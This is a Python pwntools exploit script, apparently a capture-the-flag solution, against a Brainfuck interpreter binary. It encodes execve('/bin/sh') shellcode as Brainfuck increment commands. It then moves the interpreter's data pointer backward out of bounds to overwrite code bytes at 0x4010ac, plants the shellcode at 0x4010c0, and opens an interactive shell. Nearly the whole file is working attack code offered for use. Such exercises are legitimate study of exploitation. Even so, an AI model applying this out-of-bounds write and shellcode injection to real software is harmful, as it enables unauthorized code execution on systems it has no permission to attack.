from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b*0x00000000004010AC
continue
'''.format(**locals())

exe = './bf' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

desired_shellcode = [
    0x31, 0xF6, 0x48, 0xBF, 0xD1, 0x9D, 0x96, 0x91,
    0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7, 0xDF, 0xF7,
    0xE6, 0x04, 0x3B, 0x57, 0x54, 0x5F, 0x0F, 0x05
]

def calculate_brainfuck_code(desired):
    brainfuck_code = []
    for i in range(len(desired)):
        brainfuck_code.append('+' * desired[i])
        brainfuck_code.append('>')  # Output the byte value
    
    return ''.join(brainfuck_code)

# Generate the Brainfuck code
brainfuck_code = calculate_brainfuck_code(desired_shellcode)

#local
with open('./braintest', 'w') as fd:
    payload = '<' * (0x403800 - 0x4010ac) 
    payload += '+' * (0xeb - 0xb8) # pos = 0x4010ac
    payload += '>'
    payload += '-' * (0x3c - 0x12) # pos = 0x4010ad
    # shellcode at 0x4010c0
    payload += '>' * (0x4010c0 - 0x4010ad) # pos = 0x4010c0
    payload += brainfuck_code
    fd.write(payload)

io = start(['./braintest'])
#remote
sla(b':' , payload.encode())
sl(b'q')
io.interactive()